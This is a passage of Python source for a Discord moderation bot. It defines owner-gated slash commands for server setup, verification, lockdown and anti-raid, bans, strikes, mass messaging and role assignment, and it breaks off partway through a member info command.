@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@app_commands.describe(method="Verification method")
@app_commands.choices(method=[
    app_commands.Choice(name="Button", value="button"),
    app_commands.Choice(name="Captcha", value="captcha"),
])
async def basicsetup(interaction: discord.Interaction, method: app_commands.Choice[str] = None):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    chosen = method.value if method else "button"

    # ---------- 1. WIPE EVERYTHING ----------
    for ch in list(g.channels):
        await safe(ch.delete(reason="Basic setup reset"))
    # brief pause so Discord processes deletions before we start creating
    await asyncio.sleep(2)

    # ---------- 2. ROLES ----------
    owner_role = await find_or_create_role(g, "👑 Owner", discord.Color.gold(), hoist=True, permissions=discord.Permissions.all())
    admin_role = await find_or_create_role(g, "🛡️ Administrator", discord.Color.red(), hoist=True, permissions=discord.Permissions(administrator=True))
    mod_role = await find_or_create_role(g, "🔨 Moderator", discord.Color.blue(), hoist=True, permissions=discord.Permissions(
        manage_messages=True, kick_members=True, ban_members=True,
        manage_channels=True, manage_roles=True, moderate_members=True))
    member_role = await find_or_create_role(g, CFG.MEMBER, discord.Color.green())
    u_role = await find_or_create_role(g, CFG.UNVERIFIED, discord.Color.dark_gray())
    v_role = await find_or_create_role(g, CFG.VERIFIED, discord.Color.teal())
    q_role = await find_or_create_role(g, CFG.QUARANTINE, discord.Color.dark_red())

    try:
        if g.owner and owner_role and owner_role not in g.owner.roles:
            await safe(g.owner.add_roles(owner_role, reason="Basic setup"))
    except Exception:
        pass

    # ---------- Overwrites ----------
    RO = discord.PermissionOverwrite(
        view_channel=True, send_messages=False,
        read_message_history=True, add_reactions=False,
    )
    STAFF_ONLY = {
        g.default_role: discord.PermissionOverwrite(view_channel=False),
        member_role:    discord.PermissionOverwrite(view_channel=False),
        admin_role:     discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True),
        mod_role:       discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True),
        g.me:           discord.PermissionOverwrite(view_channel=True, send_messages=True),
    }
    INFO_RO = {
        g.default_role: RO,
        member_role:    RO,
        admin_role:     discord.PermissionOverwrite(view_channel=True, send_messages=True),
        mod_role:       discord.PermissionOverwrite(view_channel=True, send_messages=True),
        g.me:           discord.PermissionOverwrite(view_channel=True, send_messages=True),
    }

    # ---------- 3. BUILD STRUCTURE — ALL CATEGORIES IN ORDER ----------
    created   = []
    rules_ch  = None
    mod_ch    = None
    verify_ch = None

    # --- INFORMATION ---
    cat = await safe(g.create_category("📜 INFORMATION"))
    if cat:
        rules_ch = await safe(g.create_text_channel(
            "📜・rules", category=cat,
            topic="Server rules and guidelines.",
            overwrites=INFO_RO,
        ))
        if rules_ch:
            created.append(rules_ch)

    # --- ANNOUNCEMENTS ---
    cat = await safe(g.create_category("📢 ANNOUNCEMENTS"))
    if cat:
        for name in ("📣・announcements", "🎉・events"):
            ch = await safe(g.create_text_channel(name, category=cat, overwrites=INFO_RO))
            if ch:
                created.append(ch)

    # --- VERIFICATION ---
    cat = await safe(g.create_category(CFG.VERIFY_CATEGORY))
    if cat:
        verify_ch = await safe(g.create_text_channel(
            CFG.VERIFY_CHANNEL, category=cat,
            overwrites={
                g.default_role: discord.PermissionOverwrite(view_channel=True, send_messages=False, read_message_history=True),
                v_role:         discord.PermissionOverwrite(view_channel=True, send_messages=False),
                g.me:           discord.PermissionOverwrite(view_channel=True, send_messages=True),
            },
            topic="Verify to gain access to the server.",
        ))
        if verify_ch:
            created.append(verify_ch)

    # --- GENERAL ---
    cat = await safe(g.create_category("💬 GENERAL"))
    if cat:
        for name in ("💬・general-chat", "🖼️・media", "🤖・bot-commands"):
            ch = await safe(g.create_text_channel(name, category=cat))
            if ch:
                created.append(ch)

    # --- VOICE ---
    cat = await safe(g.create_category("🔊 VOICE"))
    if cat:
        for name in ("🔊 General VC", "🎮 Gaming VC", "🎵 Music VC"):
            ch = await safe(g.create_voice_channel(name, category=cat))
            if ch:
                created.append(ch)

    # --- ROLES ---
    cat = await safe(g.create_category("🎭 ROLES"))
    if cat:
        ch = await safe(g.create_text_channel("🎭・roles", category=cat, overwrites=INFO_RO))
        if ch:
            created.append(ch)

    # --- STAFF (created last so it sits at the very bottom) ---
    staff_cat = await safe(g.create_category("🛡️ STAFF", overwrites={
        g.default_role: discord.PermissionOverwrite(view_channel=False),
        member_role:    discord.PermissionOverwrite(view_channel=False),
    }))
    if staff_cat:
        mod_ch = await safe(g.create_text_channel(
            "💼・staff-chat", category=staff_cat, overwrites=STAFF_ONLY,
            topic="Moderator-only channel.",
        ))
        if mod_ch:
            created.append(mod_ch)
        logs_ch = await safe(g.create_text_channel(
            CFG.STAFF_LOG_CHANNEL, category=staff_cat, overwrites=STAFF_ONLY,
            topic="Staff logs.",
        ))
        if logs_ch:
            created.append(logs_ch)

    # ---------- 4. ENABLE COMMUNITY ----------
    community_enabled = False
    community_error = ""
    if rules_ch and mod_ch:
        try:
            await g.edit(
                community=True,
                rules_channel=rules_ch,
                public_updates_channel=mod_ch,
                reason="Basic setup: enable Community",
            )
            community_enabled = True
            logger.info(f"[COMMUNITY] Enabled on {g.name} ({g.id})")
        except discord.HTTPException as e:
            community_error = str(e)
            logger.warning(f"[COMMUNITY] Failed: {e}")
            try:
                await g.edit(community=True, rules_channel=rules_ch, reason="Basic setup: Community retry")
                community_enabled = True
            except Exception as e2:
                community_error = str(e2)
                logger.warning(f"[COMMUNITY] Retry failed: {e2}")
    else:
        community_error = "rules or mod channel missing"

    # ---------- 5. LOCK UNVERIFIED ----------
    await apply_unverified_lockdown(g)

    # ---------- 6. MASS ASSIGN UNVERIFIED ----------
    assigned = 0
    if u_role:
        async def assign(m):
            nonlocal assigned
            if m.bot:
                return
            if v_role and v_role in m.roles:
                return
            if u_role in m.roles:
                return
            ok = await safe(m.add_roles(u_role, reason="Basic setup"))
            if ok is not None:
                assigned += 1
        await asyncio.gather(*[assign(m) for m in g.members])

    # ---------- 7. DROP VERIFY MESSAGE ----------
    if verify_ch:
        await send_verify_message(verify_ch, g, method=chosen)

    bot.add_view(VerifyView())
    bot.add_view(CaptchaStartView())

    # ---------- 8. SUMMARY ----------
    embed = discord.Embed(
        title="✅ Basic Setup Complete",
        description=(
            f"**Community**: {'✅ Enabled' if community_enabled else '⚠️ Failed'}\n"
            f"{('Reason: `' + community_error + '`') if community_error else ''}\n"
            f"**Rules**: {rules_ch.mention if rules_ch else '—'}\n"
            f"**Staff**: {mod_ch.mention if mod_ch else '—'}\n"
            f"**Verify**: {verify_ch.mention if verify_ch else '—'}"
        ),
        color=discord.Color.green() if community_enabled else discord.Color.orange(),
        timestamp=now_utc(),
    )
    embed.add_field(name="Channels", value=str(len(created)), inline=True)
    embed.add_field(name="Unverified assigned", value=str(assigned), inline=True)
    embed.add_field(name="Method", value=chosen, inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)


@bot.tree.command(name="basicrolesetup", description="Create the basic server roles with emojis.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def basicrolesetup(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild

    roles = {
        "👑 Owner": (discord.Color.gold(), True, discord.Permissions.all()),
        "🛡️ Administrator": (discord.Color.red(), True, discord.Permissions(administrator=True)),
        "🔨 Moderator": (discord.Color.blue(), True, discord.Permissions(
            manage_messages=True, kick_members=True, ban_members=True,
            manage_channels=True, manage_roles=True, moderate_members=True)),
        CFG.MEMBER: (discord.Color.green(), False, None),
        CFG.UNVERIFIED: (discord.Color.dark_gray(), False, None),
        CFG.VERIFIED: (discord.Color.teal(), False, None),
        CFG.QUARANTINE: (discord.Color.dark_red(), False, discord.Permissions.none()),
        CFG.MUTED: (discord.Color.dark_gray(), False, discord.Permissions(send_messages=False)),
    }
    for name, (color, hoist, perms) in roles.items():
        await find_or_create_role(g, name, color, hoist=hoist, permissions=perms)

    owner_role = discord.utils.get(g.roles, name="👑 Owner")
    try:
        if g.owner and owner_role and owner_role not in g.owner.roles:
            await safe(g.owner.add_roles(owner_role, reason="Basic role setup"))
    except Exception:
        pass

    lines = []
    for n in roles:
        r = discord.utils.get(g.roles, name=n)
        if r:
            lines.append(f"• {r.mention}")
    await interaction.followup.send("✅ Basic roles ready:\n" + "\n".join(lines), ephemeral=True)


# ==========================================================
#               VERIFICATION UPDATE / RESET
# ==========================================================
@bot.tree.command(name="updateverification", description="Re-apply the Unverified lockdown across all channels.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def updateverification(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild

    u_role = discord.utils.get(g.roles, name=CFG.UNVERIFIED)
    if not u_role:
        await interaction.followup.send(f"❌ Role `{CFG.UNVERIFIED}` not found.", ephemeral=True)
        return

    hidden, allowed = await apply_unverified_lockdown(g)
    embed = discord.Embed(
        title="✅ Verification Lockdown Updated",
        description=f"Hid **{hidden}** channels from {u_role.mention}.\nAllowed view on **{allowed}**.",
        color=discord.Color.green(),
        timestamp=now_utc(),
    )
    await interaction.followup.send(embed=embed, ephemeral=True)


@bot.tree.command(name="resetverification", description="Delete and rebuild verification channel & roles.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@app_commands.describe(method="Verification method")
@app_commands.choices(method=[
    app_commands.Choice(name="Button", value="button"),
    app_commands.Choice(name="Captcha", value="captcha"),
])
async def resetverification(interaction: discord.Interaction, method: app_commands.Choice[str] = None):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    chosen = method.value if method else "button"

    for ch in list(g.text_channels):
        if ch.name in (CFG.VERIFY_CHANNEL, "verification"):
            await safe(ch.delete(reason="Reset verification"))
    for role_name in (CFG.UNVERIFIED, CFG.VERIFIED):
        r = discord.utils.get(g.roles, name=role_name)
        if r:
            await safe(r.delete(reason="Reset verification"))

    u_role = await find_or_create_role(g, CFG.UNVERIFIED, discord.Color.dark_gray())
    v_role = await find_or_create_role(g, CFG.VERIFIED, discord.Color.green())
    cat = await find_or_create_category(g, CFG.VERIFY_CATEGORY)

    overwrites = {
        g.default_role: discord.PermissionOverwrite(view_channel=True, send_messages=False, read_message_history=True),
        v_role: discord.PermissionOverwrite(view_channel=True, send_messages=False),
        g.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True, manage_roles=True),
    }
    ch = await safe(g.create_text_channel(
        CFG.VERIFY_CHANNEL, category=cat, overwrites=overwrites,
        topic="Verify to gain access to the server."
    ))
    if ch:
        await send_verify_message(ch, g, method=chosen)
        await apply_unverified_lockdown(g)
        bot.add_view(VerifyView())
        bot.add_view(CaptchaStartView())
        await interaction.followup.send(f"✅ Verification reset. New channel: {ch.mention}", ephemeral=True)
    else:
        await interaction.followup.send("❌ Failed to recreate verification channel.", ephemeral=True)


# ==========================================================
#               SECURITY / MODERATION
# ==========================================================
def owner_only_slash():
    async def predicate(interaction: discord.Interaction):
        return interaction.user.id == OWNER_ID
    return app_commands.check(predicate)


@bot.tree.command(name="lockdown", description="Deny @everyone from sending in all text channels.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def lockdown(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    await asyncio.gather(*[
        safe(ch.set_permissions(g.default_role, send_messages=False, reason="Lockdown"))
        for ch in g.text_channels
    ])
    await interaction.followup.send("🔒 Server locked down.", ephemeral=True)


@bot.tree.command(name="unlockdown", description="Restore @everyone sending in all text channels.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def unlockdown(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    await asyncio.gather(*[
        safe(ch.set_permissions(g.default_role, send_messages=True, reason="Unlockdown"))
        for ch in g.text_channels
    ])
    await interaction.followup.send("🔓 Server unlocked.", ephemeral=True)


@bot.tree.command(name="panic", description="Emergency: lock the entire server and ping staff.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def panic(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    await asyncio.gather(*[
        safe(ch.set_permissions(g.default_role, send_messages=False, reason="PANIC"))
        for ch in g.text_channels
    ])
    staff_ch = discord.utils.get(g.text_channels, name="💼・staff-chat") \
        or discord.utils.get(g.text_channels, name="staff-chat") \
        or discord.utils.get(g.text_channels, name=CFG.STAFF_LOG_CHANNEL)
    if staff_ch:
        embed = discord.Embed(
            title="🚨 PANIC MODE ACTIVATED",
            description="@here Server locked.",
            color=discord.Color.red(),
            timestamp=now_utc(),
        )
        await safe(staff_ch.send(embed=embed))
    await interaction.followup.send("🚨 Panic mode.", ephemeral=True)


@bot.tree.command(name="antiraid", description="Control anti-raid system.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(action="status / on / off")
@app_commands.choices(action=[
    app_commands.Choice(name="status", value="status"),
    app_commands.Choice(name="on", value="on"),
    app_commands.Choice(name="off", value="off"),
])
async def antiraid(interaction: discord.Interaction, action: app_commands.Choice[str]):
    global ANTIRAID_ENABLED
    if action.value == "status":
        await interaction.response.send_message(f"🛡️ Anti-raid is **{'ON' if ANTIRAID_ENABLED else 'OFF'}**.", ephemeral=True)
        return
    ANTIRAID_ENABLED = (action.value == "on")
    FEATURES["antiraid"] = ANTIRAID_ENABLED
    await interaction.response.send_message(f"🛡️ Anti-raid → **{'ON' if ANTIRAID_ENABLED else 'OFF'}**.", ephemeral=True)


@bot.tree.command(name="securityaudit", description="Audit server security and report weaknesses.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def securityaudit(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    findings = []

    if g.default_role.permissions.administrator:
        findings.append("🚨 `@everyone` has **Administrator**.")
    if g.default_role.permissions.manage_guild:
        findings.append("⚠️ `@everyone` can **Manage Server**.")
    if g.default_role.permissions.manage_channels:
        findings.append("⚠️ `@everyone` can **Manage Channels**.")
    if g.default_role.permissions.manage_roles:
        findings.append("⚠️ `@everyone` can **Manage Roles**.")
    if g.default_role.permissions.ban_members:
        findings.append("⚠️ `@everyone` can **Ban Members**.")

    admins = [m for m in g.members if not m.bot and m.guild_permissions.administrator]
    findings.append(f"ℹ️ **{len(admins)}** administrators.")

    u_role = discord.utils.get(g.roles, name=CFG.UNVERIFIED)
    if not u_role:
        findings.append("🚨 `Unverified` role missing.")
    else:
        verify_ch = discord.utils.get(g.text_channels, name=CFG.VERIFY_CHANNEL)
        if verify_ch:
            leaked = 0
            for ch in g.channels:
                if ch.id == verify_ch.id:
                    continue
                ow = ch.overwrites_for(u_role)
                if ow.view_channel is not False:
                    leaked += 1
            if leaked:
                findings.append(f"⚠️ `Unverified` can view **{leaked}** extra channels.")

    ban_count = 0
    async for _ in g.bans():
        ban_count += 1
    findings.append(f"ℹ️ Banned users: **{ban_count}**")

    embed = discord.Embed(
        title="🛡️ Security Audit",
        description="\n".join(f"• {f}" for f in findings),
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    await interaction.followup.send(embed=embed, ephemeral=True)


@bot.tree.command(name="raidmode", description="Activate anti-raid: quarantine new joins and lock channels.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def raidmode(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild

    q_role = discord.utils.get(g.roles, name=CFG.QUARANTINE)
    if not q_role:
        q_role = await find_or_create_role(g, CFG.QUARANTINE, discord.Color.dark_red(), permissions=discord.Permissions.none())

    await asyncio.gather(*[
        safe(ch.set_permissions(g.default_role, send_messages=False, reason="Raid mode"))
        for ch in g.text_channels
    ])

    for m in g.members:
        if m.bot or m.id == OWNER_ID:
            continue
        if is_recent_account(m):
            await safe(m.add_roles(q_role, reason="Raid mode"))

    await interaction.followup.send("🚨 Raid mode active.", ephemeral=True)


@bot.tree.command(name="quarantine", description="Quarantine a member (deny view).")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member to quarantine")
async def quarantine(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    q_role = discord.utils.get(g.roles, name=CFG.QUARANTINE)
    if not q_role:
        q_role = await find_or_create_role(g, CFG.QUARANTINE, discord.Color.dark_red(), permissions=discord.Permissions.none())

    await safe(member.add_roles(q_role, reason="Quarantine"))
    await asyncio.gather(*[
        safe(ch.set_permissions(member, view_channel=False, reason="Quarantine"))
        for ch in g.channels
    ])
    await interaction.followup.send(f"☣️ {member.mention} quarantined.", ephemeral=True)


@bot.tree.command(name="unquarantine", description="Remove quarantine from a member.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member to unquarantine")
async def unquarantine(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    q_role = discord.utils.get(g.roles, name=CFG.QUARANTINE)
    if q_role and q_role in member.roles:
        await safe(member.remove_roles(q_role, reason="Unquarantine"))
    await asyncio.gather(*[
        safe(ch.set_permissions(member, overwrite=None, reason="Unquarantine"))
        for ch in g.channels
    ])
    await interaction.followup.send(f"🔓 {member.mention} unquarantined.", ephemeral=True)


@bot.tree.command(name="softban", description="Ban+unban to clear recent messages.")
@app_commands.default_permissions(ban_members=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member to softban", reason="Reason")
async def softban(interaction: discord.Interaction, member: discord.Member, reason: str = "softban"):
    await interaction.response.defer(ephemeral=True, thinking=True)
    ok = await safe(member.ban(reason=reason, delete_message_days=7))
    if ok is None:
        await interaction.followup.send(f"❌ Failed to softban {member.mention}.", ephemeral=True)
        return
    await safe(interaction.guild.unban(member, reason=f"softban: {reason}"))
    await interaction.followup.send(f"🧹 {member.mention} softbanned.", ephemeral=True)


@bot.tree.command(name="slowmode", description="Set slowmode in every text channel.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(seconds="Slowmode delay (0–21600)")
async def slowmode(interaction: discord.Interaction, seconds: app_commands.Range[int, 0, 21600] = 10):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    await asyncio.gather(*[safe(ch.edit(slowmode_delay=seconds, reason="Slowmode")) for ch in g.text_channels])
    await interaction.followup.send(f"🐌 Slowmode set to {seconds}s.", ephemeral=True)


@bot.tree.command(name="purge", description="Delete the last N messages in this channel.")
@app_commands.default_permissions(manage_messages=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(amount="1–1000")
async def purge(interaction: discord.Interaction, amount: app_commands.Range[int, 1, 1000] = 100):
    await interaction.response.defer(ephemeral=True, thinking=True)
    try:
        deleted = await interaction.channel.purge(limit=amount)
        await interaction.followup.send(f"🧹 Deleted {len(deleted)} messages.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Failed: {e}", ephemeral=True)


@bot.tree.command(name="yeet", description="Kick a member.")
@app_commands.default_permissions(kick_members=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member", reason="Reason")
async def yeet(interaction: discord.Interaction, member: discord.Member, reason: str = "security"):
    await interaction.response.defer(ephemeral=True, thinking=True)
    ok = await safe(member.kick(reason=reason))
    await interaction.followup.send(
        f"👢 {member.mention} kicked." if ok is not None else f"❌ Couldn't kick {member.mention}.",
        ephemeral=True
    )


@bot.tree.command(name="hammer", description="Ban a member.")
@app_commands.default_permissions(ban_members=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member", reason="Reason", delete_days="Delete messages (0–7 days)")
async def hammer(interaction: discord.Interaction, member: discord.Member, reason: str = "security", delete_days: app_commands.Range[int, 0, 7] = 1):
    await interaction.response.defer(ephemeral=True, thinking=True)
    ok = await safe(member.ban(reason=reason, delete_message_days=delete_days))
    await interaction.followup.send(
        f"🔨 {member.mention} banned." if ok is not None else f"❌ Couldn't ban {member.mention}.",
        ephemeral=True
    )


@bot.tree.command(name="unban_all", description="Unban every banned user.")
@app_commands.default_permissions(ban_members=True)
@app_commands.guild_only()
@owner_only_slash()
async def unban_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    count = 0
    async for entry in g.bans():
        ok = await safe(g.unban(entry.user, reason="Mass unban"))
        if ok is not None:
            count += 1
    await interaction.followup.send(f"🔓 Unbanned {count} users.", ephemeral=True)


@bot.tree.command(name="silence", description="Timeout a member.")
@app_commands.default_permissions(moderate_members=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member", hours="1–168 hours")
async def silence(interaction: discord.Interaction, member: discord.Member, hours: app_commands.Range[int, 1, 168] = 24):
    await interaction.response.defer(ephemeral=True, thinking=True)
    try:
        await member.timeout(timedelta(hours=hours), reason="security")
        await interaction.followup.send(f"🤐 {member.mention} silenced for {hours}h.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Failed: {e}", ephemeral=True)


@bot.tree.command(name="clearreactions", description="Clear all reactions from a message.")
@app_commands.default_permissions(manage_messages=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(message_id="Message ID")
async def clearreactions(interaction: discord.Interaction, message_id: str):
    await interaction.response.defer(ephemeral=True, thinking=True)
    try:
        msg = await interaction.channel.fetch_message(int(message_id))
        await msg.clear_reactions()
        await interaction.followup.send("🧼 Reactions cleared.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Failed: {e}", ephemeral=True)


# ==========================================================
# STRIKES
# ==========================================================
@bot.tree.command(name="strike", description="Add a strike to a member.")
@app_commands.default_permissions(moderate_members=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member", reason="Reason")
async def strike_cmd(interaction: discord.Interaction, member: discord.Member, reason: str = "unspecified"):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    gid = str(g.id)
    uid = str(member.id)
    STRIKES.setdefault(gid, {}).setdefault(uid, [])
    STRIKES[gid][uid].append({
        "reason": reason,
        "by": interaction.user.id,
        "ts": int(time.time()),
    })
    save_strikes()

    embed = discord.Embed(
        title="⚠️ Strike Added",
        description=f"{member.mention} — {reason}\nTotal: **{len(STRIKES[gid][uid])}**",
        color=discord.Color.orange(),
        timestamp=now_utc(),
    )
    await interaction.followup.send(embed=embed, ephemeral=True)

    if len(STRIKES[gid][uid]) >= 3:
        embed2 = discord.Embed(
            title="🔨 Auto-Punishment",
            description=f"{member.mention} has 3 strikes → auto-banned.",
            color=discord.Color.red(),
            timestamp=now_utc(),
        )
        await safe(member.ban(reason="3 strikes", delete_message_days=1))
        await log_to_staff(g, embed2)


@bot.tree.command(name="strikes", description="Show strikes for a member.")
@app_commands.default_permissions(moderate_members=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member")
async def strikes_cmd(interaction: discord.Interaction, member: discord.Member):
    gid = str(interaction.guild.id)
    uid = str(member.id)
    items = STRIKES.get(gid, {}).get(uid, [])
    if not items:
        await interaction.response.send_message(f"✅ {member.mention} has no strikes.", ephemeral=True)
        return
    lines = []
    for i, s in enumerate(items, 1):
        when = ts(datetime.fromtimestamp(s["ts"], timezone.utc), "R")
        lines.append(f"`{i}.` {s['reason']} — {when}")
    embed = discord.Embed(
        title=f"⚠️ Strikes — {member}",
        description="\n".join(lines),
        color=discord.Color.orange(),
        timestamp=now_utc(),
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="clearstrikes", description="Clear strikes for a member.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member")
async def clearstrikes(interaction: discord.Interaction, member: discord.Member):
    gid = str(interaction.guild.id)
    uid = str(member.id)
    STRIKES.get(gid, {}).pop(uid, None)
    save_strikes()
    await interaction.response.send_message(f"🧼 Strikes cleared for {member.mention}.", ephemeral=True)


# ==========================================================
# FEATURE TOGGLE
# ==========================================================
@bot.tree.command(name="togglefeature", description="Toggle a bot feature.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(feature="Feature to toggle")
@app_commands.choices(feature=[
    app_commands.Choice(name="antiraid", value="antiraid"),
    app_commands.Choice(name="autohoist", value="autohoist"),
    app_commands.Choice(name="automember", value="automember"),
    app_commands.Choice(name="newaccount_warn", value="newaccount_warn"),
    app_commands.Choice(name="captcha_resend", value="captcha_resend"),
])
async def togglefeature(interaction: discord.Interaction, feature: app_commands.Choice[str]):
    global ANTIRAID_ENABLED
    key = feature.value
    FEATURES[key] = not FEATURES[key]
    if key == "antiraid":
        ANTIRAID_ENABLED = FEATURES["antiraid"]
    await interaction.response.send_message(
        f"🔧 Feature `{key}` → **{'ON' if FEATURES[key] else 'OFF'}**",
        ephemeral=True
    )


# ==========================================================
# UTILITY / INFO
# ==========================================================
@bot.tree.command(name="announce", description="Send a formatted announcement embed.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def announce(interaction: discord.Interaction, title: str, text: str, channel: discord.TextChannel = None):
    await interaction.response.defer(ephemeral=True, thinking=True)
    target = channel or interaction.channel
    embed = discord.Embed(
        title=title, description=text,
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    embed.set_footer(text=f"Announced by {interaction.user}")
    ok = await safe(target.send(embed=embed))
    await interaction.followup.send(
        f"📣 Sent to {target.mention}." if ok is not None else "❌ Failed to send.",
        ephemeral=True
    )


@bot.tree.command(name="dm_all", description="DM every member of the server.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def dm_all(interaction: discord.Interaction, text: str):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    sent, failed = 0, 0
    async def send(m):
        nonlocal sent, failed
        if m.bot:
            return
        try:
            await m.send(text)
            sent += 1
        except Exception:
            failed += 1
    await asyncio.gather(*[send(m) for m in g.members])
    await interaction.followup.send(f"📨 DM sent: **{sent}**, failed: **{failed}**.", ephemeral=True)


@bot.tree.command(name="role_all", description="Add a role to every member.")
@app_commands.default_permissions(manage_roles=True)
@app_commands.guild_only()
@owner_only_slash()
async def role_all(interaction: discord.Interaction, role: discord.Role):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    count = 0
    async def assign(m):
        nonlocal count
        if m.bot or role in m.roles:
            return
        ok = await safe(m.add_roles(role, reason="role_all"))
        if ok is not None:
            count += 1
    await asyncio.gather(*[assign(m) for m in g.members])
    await interaction.followup.send(f"➕ Added {role.mention} to {count} members.", ephemeral=True)


@bot.tree.command(name="massrole", description="Add or remove a role from every member.")
@app_commands.default_permissions(manage_roles=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(mode="add / remove", role="Role")
@app_commands.choices(mode=[
    app_commands.Choice(name="add", value="add"),
    app_commands.Choice(name="remove", value="remove"),
])
async def massrole(interaction: discord.Interaction, mode: app_commands.Choice[str], role: discord.Role):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    count = 0
    async def work(m):
        nonlocal count
        if m.bot:
            return
        if mode.value == "add":
            if role in m.roles:
                return
            ok = await safe(m.add_roles(role, reason="massrole"))
        else:
            if role not in m.roles:
                return
            ok = await safe(m.remove_roles(role, reason="massrole"))
        if ok is not None:
            count += 1
    await asyncio.gather(*[work(m) for m in g.members])
    await interaction.followup.send(
        f"{'➕' if mode.value == 'add' else '➖'} {mode.value}ed {role.mention} on {count} members.",
        ephemeral=True
    )


@bot.tree.command(name="serverinfo", description="Show server stats.")
@app_commands.guild_only()
@owner_only_slash()
async def serverinfo(interaction: discord.Interaction):
    g = interaction.guild
    embed = discord.Embed(
        title=g.name, description=f"ID: `{g.id}`",
        color=discord.Color.from_rgb(30, 60, 130), timestamp=now_utc()
    )
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    embed.add_field(name="Owner", value=g.owner.mention if g.owner else "?", inline=True)
    embed.add_field(name="Members", value=str(g.member_count), inline=True)
    embed.add_field(name="Channels", value=str(len(g.channels)), inline=True)
    embed.add_field(name="Roles", value=str(len(g.roles)), inline=True)
    embed.add_field(name="Boosts", value=f"{g.premium_subscription_count} (Lvl {g.premium_tier})", inline=True)
    embed.add_field(name="Created", value=ts(g.created_at, "D"), inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="userinfo", description="Show info about a member.")
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Target member (defaults to you)")
async def userinfo(interaction: discord.Interaction, member: discord.Member = None):
    m = member or interaction.user
    embed = discord.Embed(title=str(m), description=f"ID: `{m.id}`", color=m.color, timestamp=now_utc())
    embed.set_thumbnail(url=m.display_avatar.url)
    embed.add_field(name="Joined", value=ts(m.joined_at, "R") if m.joined_at else "?", inline=True)
    embed.add_field(name="Created", value=ts(m.created_at, "R"), inline=True)
    roles = [r.mention for r in m.roles if r.name != "@everyone"]
    embed.add_field(name=f"Roles ({len(roles)})", value=" ".join(roles) if roles else "—", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="whois", description="Full card for a member.")
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Target member (defaults to you)")
async def whois(interaction: discord.Interaction, member: discord.Member = None):
    m = member or interaction.user
    gid = str(interaction.guild.id)
    uid = str(m.id)
    strikes = len(STRIKES.get(gid, {}).get(uid, []))
